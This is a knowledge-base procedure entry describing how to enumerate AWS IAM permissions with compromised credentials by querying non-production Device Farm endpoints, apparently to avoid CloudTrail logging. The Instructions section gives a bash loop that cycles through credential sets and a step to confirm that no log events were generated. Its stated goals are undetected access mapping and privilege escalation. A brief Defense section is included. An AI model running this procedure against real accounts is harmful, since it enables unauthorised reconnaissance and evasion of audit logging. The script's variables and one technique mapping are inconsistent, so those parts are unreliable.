---
id: proc-enumerate-permissions-001
tags:
  - aws
  - iam
  - enumeration
  - reconnaissance
type: procedure
tools:
  - '[[tools/AWS-CLI]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/aws-devicefarm-get-account-settings-non-production]]'
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1087.004]]'
  - '[[Container and Resource Discovery]]'
updated_at: '2025-12-14T17:32:20.642Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[T1087.004]]'
  - '[[Container and Resource Discovery]]'
---
# Enumerate-IAM-Permissions-Using-Non-Production-Endpoints

## Summary

This procedure uses non-production AWS Device Farm endpoints to iteratively test IAM credentials against various API calls, mapping permissions based on success/failure without generating CloudTrail logs.

## Description

With compromised IAM credentials, attackers can systematically probe Device Farm actions via non-production endpoints (e.g., redacted URLs like https://nonprod.devicefarm.us-west-2.amazonaws.com and https://nonprod2.devicefarm.us-west-2.amazonaws.com). Responses indicate permission levels, enabling full reconnaissance while evading log-based detection. This is particularly dangerous for lateral movement planning in AWS environments.

## Requirements

1. Multiple IAM credential sets (e.g., via assumed roles or access keys)
2. List of non-production endpoints (at least two redacted ones)
3. AWS CLI scripted for batch testing
4. Local logging for response analysis

## Defense

Defensive measures and detection strategies:

- Rotate IAM credentials regularly and monitor for unusual access patterns
- Enable AWS GuardDuty for anomalous API behavior detection
- Restrict --endpoint-url usage via proxy or CLI wrappers
- Audit IAM policies for over-privileging on Device Farm

## Objectives

1. Map Device Farm permissions for given IAM identities
2. Identify exploitable access without detection
3. Facilitate further reconnaissance or privilege escalation

## Instructions

### Step 1: Prepare Test Script

**Context**: Set up a loop or script to test credentials against endpoints.

**Command** (Bash example for iteration):
```bash
for cred in cred1 cred2; do
  export AWS_ACCESS_KEY_ID=$cred_key; export AWS_SECRET_ACCESS_KEY=$cred_secret;
  aws devicefarm get-account-settings --region us-west-2 --endpoint-url https://nonprod.devicefarm.us-west-2.amazonaws.com > response_$cred.json;
  echo "Credential $cred: $(jq . response_$cred.json)" >> results.txt;
done
```

> Adapt for multiple endpoints; capture responses to infer permissions from JSON or errors.

### Step 2: Analyze Responses and Confirm Silence

**Context**: Review outputs and check CloudTrail for logs.

**Command** (No specific, use file analysis):
```bash
cat results.txt
```

> Success (JSON) indicates permission; failure (error) denies. Verify no CloudTrail events across tests.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[T1087.004]] Cloud Account
- [[Container and Resource Discovery]] Gather Victim Identity Information

### Sub-Techniques


## Commands Used

- [[commands/aws-devicefarm-get-account-settings-non-production]]

## Tools Used

- [[tools/AWS-CLI]]

## Tags

- iam-enumeration
- aws-recon
